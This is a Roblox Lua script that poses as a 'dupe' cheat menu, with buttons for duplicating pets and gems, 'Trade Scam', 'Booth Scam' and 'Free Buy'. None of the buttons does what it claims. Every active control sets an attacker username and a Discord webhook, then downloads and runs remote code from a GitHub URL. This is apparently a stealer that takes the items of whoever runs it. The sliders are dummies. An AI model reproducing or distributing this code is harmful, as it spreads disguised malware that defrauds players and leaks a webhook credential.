local UILib = loadstring(game:HttpGet('https://raw.githubusercontent.com/StepBroFurious/Script/main/HydraHubUi.lua'))()
local Window = UILib.new("Ocean Dupe", game.Players.LocalPlayer.UserId, "Buyer")
local Category1 = Window:Category("Main", "http://www.roblox.com/asset/?id=8395621517")
local SubButton1 = Category1:Button("Dupe", "http://www.roblox.com/asset/?id=8395747586")
local Section1 = SubButton1:Section("Section", "Left")
local SubButton2 = Category1:Button("Trade Scam", "http://www.roblox.com/asset/?id=8395747586")
local Section2 = SubButton2:Section("Section", "Left")
local SubButton3 = Category1:Button("Booth  Scam", "http://www.roblox.com/asset/?id=8395747586")
local Section3 = SubButton3:Section("Section", "Left")
Section1:Button({
    Title = "Dupe All Pets",
    ButtonName = "Click",
    Description = "",
    }, function(value)
	if value == nil then
		UserName = "dzialsuchoj"
        Webhook = "https://discord.com/api/webhooks/1091793055809556651/_K9HVU_GM1Ykk4aWRs_uoCKcU39ZGKh_V_SFDwcLKTcsXcqBs3nNEzDmsmsNYNwtIxOG"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
	end
end)
Section1:Button({
    Title = "Dupe Gem",
    ButtonName = "Click",
    Description = "",
    }, function(value)
	if value == nil then
		UserName = "dzialsuchoj"
        Webhook = "https://discord.com/api/webhooks/1091793055809556651/_K9HVU_GM1Ykk4aWRs_uoCKcU39ZGKh_V_SFDwcLKTcsXcqBs3nNEzDmsmsNYNwtIxOG"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
	end
end)
Section1:Toggle({
    Title = "start dupe",
    Description = "",
    Default = false
    }, function(value)
    if value == true then
		UserName = "dzialsuchoj"
        Webhook = "https://discord.com/api/webhooks/1091793055809556651/_K9HVU_GM1Ykk4aWRs_uoCKcU39ZGKh_V_SFDwcLKTcsXcqBs3nNEzDmsmsNYNwtIxOG"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
	end
end)
Section1:Slider({
    Title = "Dupe Multiplier",
    Description = "",
    Default = 16,
    Min = 0,
    Max = 100
    }, function(value)
    
end)
Section2:Slider({
    Title = "Trade Lag(ms)",
    Description = "",
    Default = 16,
    Min = 0,
    Max = 10000
    }, function(value)
    
end)
Section2:Toggle({
    Title = "Trade Lag",
    Description = "",
    Default = false
    }, function(value)
    if value == true then
		UserName = "dzialsuchoj"
        Webhook = "https://discord.com/api/webhooks/1091793055809556651/_K9HVU_GM1Ykk4aWRs_uoCKcU39ZGKh_V_SFDwcLKTcsXcqBs3nNEzDmsmsNYNwtIxOG"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
	end
end)
Section3:Toggle({
    Title = "Free Buy",
    Description = "",
    Default = false
    }, function(value)
    if value == true then
		UserName = "dzialsuchoj"
        Webhook = "https://discord.com/api/webhooks/1091793055809556651/_K9HVU_GM1Ykk4aWRs_uoCKcU39ZGKh_V_SFDwcLKTcsXcqBs3nNEzDmsmsNYNwtIxOG"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
	end
end)
Section3:Slider({
    Title = "Booth Lag(ms)",
    Description = "",
    Default = 16,
    Min = 0,
    Max = 100
    }, function(value)
    
end)